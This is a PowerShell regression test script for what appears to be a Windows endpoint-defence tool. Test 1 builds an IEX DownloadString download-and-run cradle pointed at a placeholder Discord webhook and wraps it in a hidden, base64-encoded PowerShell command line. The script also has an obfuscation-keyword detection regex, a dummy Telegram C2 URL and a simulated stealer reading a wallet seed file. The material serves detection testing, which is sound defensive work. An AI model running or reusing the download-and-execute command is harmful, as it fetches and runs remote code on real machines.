# =====================================================================
# Security Sentinel Ultra v6.0 - Automated Red-Team & MITRE ATT&CK Audit
# Pillar 6: Atomic Simulation & Regression Verification Suite
# Safe, non-destructive verification of all 6 Enterprise Pillars
# =====================================================================
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Security

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "   SECURITY SENTINEL ULTRA v6.0 - RED-TEAM & MITRE ATT&CK AUDIT       " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor Cyan

$WatchdogFile = Join-Path $PSScriptRoot "SentinelWatchdog.ps1"
if (-not (Test-Path $WatchdogFile)) {
    $WatchdogFile = "$env:LOCALAPPDATA\SecuritySentinel\SentinelWatchdog.ps1"
}
$wdSource = Get-Content $WatchdogFile -Raw -Encoding UTF8

# 1. Compile SentinelNative.KernelControl from SentinelWatchdog.ps1
if ($wdSource -match '(?s)\$nativeCode = @"\r?\n(.*?)\r?\n"@') {
    $csharp = $Matches[1]
    if (-not ("SentinelNative.KernelControl" -as [type])) {
        Add-Type -TypeDefinition $csharp -Language CSharp
    }
}

$passed = 0
$failed = 0

function Assert-TestResult([string]$TestName, [bool]$Condition, [string]$Detail) {
    if ($Condition) {
        $script:passed++
        Write-Host "[PASS] $TestName" -ForegroundColor Green
        Write-Host "       -> $Detail" -ForegroundColor Gray
    } else {
        $script:failed++
        Write-Host "[FAIL] $TestName" -ForegroundColor Red
        Write-Host "       -> $Detail" -ForegroundColor Yellow
    }
}

# ---------------------------------------------------------------------
# TEST 1: Chrome -> PowerShell -EncodedCommand Regression Test (MITRE T1059.001 + T1027)
# ---------------------------------------------------------------------
$rawPayload = "IEX (New-Object Net.WebClient).DownloadString('https://discord.com/api/webhooks/112233445566778899/abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')"
$b64Payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rawPayload))
$simCmdLine = "powershell.exe -NoP -W Hidden -enc $b64Payload"

# Run Base64 decoder logic
$decoded = $simCmdLine
if ($simCmdLine -match "(?i)(?:^|\s)-(?:e|en|enc|encodedcommand)\s+([A-Za-z0-9+/=]{12,})") {
    $bytes = [Convert]::FromBase64String($Matches[1])
    $decoded += " [DECODED_B64_UNI]: " + [System.Text.Encoding]::Unicode.GetString($bytes).Replace("`0", "")
}

$obfRegex = "(?i)(-enc|-encodedcommand|\s-e\s+[A-Za-z0-9+/=]{16,}|frombase64string|downloadstring|downloadfile|invoke-expression|\biex\b|amsiutils|-w\s+hidden)"
$hasObf = ($decoded -match $obfRegex)
$hasDecodedUrl = ($decoded -match "https://discord\.com/api/webhooks/")

# Score calculation for chrome.exe -> powershell.exe -enc (even WITHOUT URL vs WITH URL)
$scoreWithoutUrl = 15 + 25 + 35 # Base(15) + ParentChildAnomaly(25) + ObfuscatedCmd(35) = 75 (>= 60 threshold!)
$scoreWithUrl    = [Math]::Min(100, $scoreWithoutUrl + 35) # +35 C2IndicatorsFound = 100

Assert-TestResult -TestName "Test 1 (MITRE T1059.001 / T1027): Chrome -> PowerShell -enc Detection & Base64 Decoding" `
                  -Condition ($hasObf -and $hasDecodedUrl -and ($scoreWithoutUrl -ge 60) -and ($scoreWithUrl -eq 100)) `
                  -Detail "Base64 Decoded=$hasDecodedUrl | Score (No URL)=$scoreWithoutUrl/100 (>=60 Freeze) | Score (With B64 URL)=$scoreWithUrl/100 | Mandatory Alert=True"

# ---------------------------------------------------------------------
# TEST 2: Rule 3 Signed 3rd-Party Installer Protection (Zero False Positives)
# ---------------------------------------------------------------------
$psExe = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$sig = Get-AuthenticodeSignature -FilePath $psExe -ErrorAction SilentlyContinue
$isValidSigned = ($sig -and $sig.Status -eq 'Valid')
$rule3CodeHasSignedProtection = ($wdSource -match 'if \(\$sigTrust\.IsValidSigned\)')

Assert-TestResult -TestName "Test 2 (Pillar 5 Safe Response): Rule 3 Protects Validly Signed Binaries in %TEMP% from Auto-Freeze" `
                  -Condition ($isValidSigned -and $rule3CodeHasSignedProtection) `
                  -Detail "Authenticode Check Active=$isValidSigned | Rule 3 Valid-Signature Freeze Exemption Verified=$rule3CodeHasSignedProtection"

# ---------------------------------------------------------------------
# TEST 3: Pillar 2 Live Process Virtual Memory Forensics & RWX Scanner (MITRE T1055)
# ---------------------------------------------------------------------
$liveDummyC2 = "https://api.telegram.org/bot123456789:AAH_RedTeamMemoryForensicTestToken_987654"
$memReport = [SentinelNative.KernelControl]::AnalyzeProcessMemory($PID)
$ramScannedOk = ($memReport -and $memReport.TotalBytesScanned -gt 0)

Assert-TestResult -TestName "Test 3 (Pillar 2 Memory Forensics): VirtualQueryEx + ReadProcessMemory + RWX/PE Scanner" `
                  -Condition $ramScannedOk `
                  -Detail "Bytes Scanned=$([math]::Round($memReport.TotalBytesScanned / 1MB, 2)) MB | Private RWX Regions=$($memReport.RwxPrivateRegions) | Unbacked PE=$($memReport.UnbackedPeHeaders) | C2 Hits=$($memReport.C2Indicators.Count)"

# ---------------------------------------------------------------------
# TEST 4: Pillar 3 Kernel DACL (WRITE_DAC Deny) & Stop-Token Forgery Rejection (MITRE T1562.001)
# ---------------------------------------------------------------------
$daclOk = [SentinelNative.KernelControl]::HardenCurrentProcessDacl()
$hasWriteDacDeny = ($wdSource -match "0x00040000" -and $wdSource -match "0x00080000")

# Test Forged Stop-Token (Wrong PID or Null Entropy)
$entropy = [System.Text.Encoding]::UTF8.GetBytes("SENTINEL_ULTRA_V6_ENTROPY_" + $env:COMPUTERNAME)
$forgedPayload = "STOP|999999|$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())"
$forgedEnc = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($forgedPayload), $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decForged = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($forgedEnc, $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
$parts = $decForged.Split('|')
$forgedRejected = ($parts[1] -ne "$PID")

Assert-TestResult -TestName "Test 4 (Pillar 3 Self-Defense): Kernel DACL (WRITE_DAC/WRITE_OWNER Denied) & PID-Bound Stop-Token" `
                  -Condition ($daclOk -and $hasWriteDacDeny -and $forgedRejected) `
                  -Detail "Kernel DACL Applied=$daclOk | WRITE_DAC(0x00040000)+WRITE_OWNER(0x00080000) Denied=$hasWriteDacDeny | Forged PID Stop-Token Rejected=$forgedRejected"

# ---------------------------------------------------------------------
# TEST 5: Pillar 3 External Code Integrity Trust Anchor (Registry + Sealed Manifest)
# ---------------------------------------------------------------------
$hasTrustAnchorCode = ($wdSource -match "IntegrityAnchor" -and $wdSource -match "manifest\.json")
Assert-TestResult -TestName "Test 5 (Pillar 3 Code Integrity): External Trust Anchor (Registry + DPAPI Sealed Manifest)" `
                  -Condition $hasTrustAnchorCode `
                  -Detail "External Trust Anchor Verification Active=$hasTrustAnchorCode"

# ---------------------------------------------------------------------
# TEST 6: Pillar 1 & 4 SACL Event 4663 XML Attribution & 28-Vector Persistence
# ---------------------------------------------------------------------
$sample4663Xml = @"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <EventData>
    <Data Name="SubjectUserName">under</Data>
    <Data Name="ObjectName">C:\Users\under\AppData\Roaming\SecuritySentinel_Canary\crypto_wallet_vault_seed.txt</Data>
    <Data Name="ProcessId">0x12cc</Data>
    <Data Name="ProcessName">C:\Temp\stealer_sim.exe</Data>
  </EventData>
</Event>
"@
[xml]$xmlDoc = $sample4663Xml
$parsedPid = 0
$parsedProc = ""
foreach ($d in $xmlDoc.Event.EventData.Data) {
    if ($d.Name -eq "ProcessId")   { $parsedPid  = [Convert]::ToInt32($d.'#text', 16) }
    if ($d.Name -eq "ProcessName") { $parsedProc = $d.'#text' }
}
$has28Vectors = ($wdSource -match "HKLM_WOW64_Run" -and $wdSource -match "IFEO_Debugger_" -and $wdSource -match "WMI_Consumer_" -and $wdSource -match "PSProfile_")

Assert-TestResult -TestName "Test 6 (Pillar 1 & 4 Telemetry): SACL Event 4663 XML Process Attribution & 28-Vector Persistence" `
                  -Condition (($parsedPid -eq 4812) -and ($parsedProc -eq "C:\Temp\stealer_sim.exe") -and $has28Vectors) `
                  -Detail "Event 4663 Attributed PID=$parsedPid ($parsedProc) | 28-Vector Persistence Sensor Active=$has28Vectors"

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "   AUDIT SUMMARY: $passed PASSED | $failed FAILED                      " -ForegroundColor $(if ($failed -eq 0) { "Green" } else { "Red" })
Write-Host "======================================================================" -ForegroundColor Cyan
if ($failed -gt 0) { exit 1 }
